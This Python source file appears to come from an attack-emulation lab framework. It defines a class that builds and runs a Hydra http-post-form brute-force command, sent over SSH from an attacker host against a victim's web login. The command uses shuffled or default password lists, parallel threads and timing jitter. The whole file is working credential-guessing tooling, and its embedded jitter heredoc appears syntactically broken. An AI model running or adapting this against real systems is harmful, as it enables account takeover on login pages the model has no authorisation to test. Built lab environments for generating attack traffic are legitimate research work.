import logging
import random
logger = logging.getLogger("[Action:BRUTE_HTTP]")

class HydraHttpPostBruteAction:
    """
    Hydra http-post-form.
    Params (YAML):
      - path: "/login:username=^USER^&password=^PASS^:F=Invalid"  (form completo)
        OU use path="/login", user_field/password_field/fail_regex abaixo
      - user: "webuser" OU caminho (-L)
      - pass_list: lista OU caminho (-P)
      - port: 80
      - output: "~/exp_brute/hydra_http"
      - threads: 4
      - user_field: "username" (se path não vier completo)
      - pass_field: "password"
      - fail_regex: "Invalid|Falha"
    Workload:
      - http_attempts, max_parallel_bruteforce, jitter_ms
    """
    def __init__(self,
                 path="/login",
                 user="webuser",
                 pass_list=None,
                 port=80,
                 output="~/exp_brute/hydra_http",
                 threads=4,
                 user_field="username",
                 pass_field="password",
                 fail_regex="Invalid",
                 **kwargs):
        self.path = path
        self.user = user
        self.pass_list = list(pass_list) if isinstance(pass_list, (list, tuple)) else pass_list
        self.port = int(port)
        self.output = output
        self.threads = int(threads)
        self.user_field = user_field
        self.pass_field = pass_field
        self.fail_regex = fail_regex
        self._extra = kwargs

    def _build_form(self):
        # Se path já vier no formato "path:postdata:fail", usa direto
        if ":" in self.path and ("^USER^" in self.path or self.user_field in self.path):
            return self.path
        # Caso contrário, monta
        return f"{self.path}:{self.user_field}=^USER^&{self.pass_field}=^PASS^:F={self.fail_regex}"

    def run(self, attacker_ssh, victim_ip: str, workload=None, **kwargs):
        workload = workload or {}
        threads = int(workload.get("max_parallel_bruteforce", self.threads))
        attempts = int(workload.get("http_attempts", 0))
        jitter = workload.get("jitter_ms", [60, 180])
        jmin = int(jitter[0]) if isinstance(jitter, (list, tuple)) else 60
        jmax = int(jitter[1]) if isinstance(jitter, (list, tuple)) and len(jitter) > 1 else 180

        try:
            # -l/-L
            if isinstance(self.user, str) and (self.user.startswith("~") or "/" in self.user or "\\" in self.user):
                user_opt = f"-L {self.user}"
            else:
                user_opt = f"-l {self.user}"

            # -P
            if isinstance(self.pass_list, (list, tuple)):
                pw = list(self.pass_list)
                random.shuffle(pw)
                if attempts > 0:
                    pw = pw[:attempts]
                pass_pipe = "\\n".join(pw)
                p_opt = f"-P <(printf '{pass_pipe}\\n')"
            elif isinstance(self.pass_list, str) and self.pass_list.strip():
                p_opt = f"-P {self.pass_list}"
            else:
                p_opt = "-P <(printf '123456\\npassword\\n')"

            form = self._build_form()
            cmd = (
                "bash -lc "
                f"\"IP={victim_ip}; "
                f"python3 - <<'PY';import random,time;time.sleep(random.randint({jmin},{jmax})/1000.0);PY; "
                f"hydra {user_opt} {p_opt} $IP -s {self.port} http-post-form '{form}' -t {threads} -I -f -o {self.output}\""
            )
            logger.info(f"[BRUTE_HTTP] threads={threads}")
            attacker_ssh.run_command("attacker", cmd, timeout=600)
        except Exception as e:
            logger.error(f"[BRUTE_HTTP] Falhou: {e}")
            raise
